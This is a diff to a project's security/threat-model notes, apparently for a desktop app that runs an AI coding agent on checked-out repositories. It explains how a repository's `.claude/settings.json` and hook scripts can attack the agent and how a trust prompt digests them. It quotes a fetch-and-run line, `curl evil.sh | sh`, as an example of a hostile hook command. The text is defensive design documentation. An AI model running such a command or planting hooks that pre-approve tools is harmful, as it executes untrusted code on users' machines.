@@ -22,10 +22,15 @@ service of its own — so most of the usual surface does not exist. What does:
 
 - **A repository can attack the agent that opens it.** `.claude/settings.json`
   in a checkout can pre-approve tools and name hook scripts that run on the
-  user's machine. `src/core/repoTrust.ts` digests those settings and the hooks
-  they name, and shows them once before any of it is believed. A way to get
-  settings or a hook honoured without that prompt is the most serious bug this
-  project can have.
+  user's machine. `src/core/repoTrust.ts` digests those settings and every file
+  under `.claude/hooks/`, and shows them once before any of it is believed. Not
+  the scripts the settings _name_: a hook `command` is a shell string, and
+  `curl evil.sh | sh` names no file to resolve — so the directory is read whole
+  and to the bottom instead, which is a narrower promise the code can keep. A
+  link out of the worktree is neither followed nor dropped: where it leads is
+  shown and digested, so retargeting it asks again. A way to get settings or a
+  hook honoured without that prompt is the most serious bug this project can
+  have.
 - **A repository can supply the shell the Run button executes.** A checkout
   carrying `.octopus/scripts/` or a `.conductor/` decides what runs, ahead of
   anything configured in the app — so a `git pull` can change it.
